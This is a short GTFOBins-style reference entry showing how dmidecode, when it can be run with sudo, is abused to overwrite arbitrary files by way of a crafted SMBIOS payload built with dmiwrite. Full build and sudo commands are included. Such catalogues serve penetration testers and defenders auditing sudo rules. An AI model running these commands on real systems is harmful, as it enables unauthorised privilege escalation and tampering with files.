# GTFOBin: dmidecode

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

It can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.
Generate the file with dmiwrite and upload it to the target.

`--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.

`--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.

```
make dmiwrite
TF=$(mktemp)
echo "DATA" > $TF
./dmiwrite $TF x.dmi

```

```
LFILE=file_to_write
sudo dmidecode --no-sysfs -d x.dmi --dump-bin "$LFILE"
```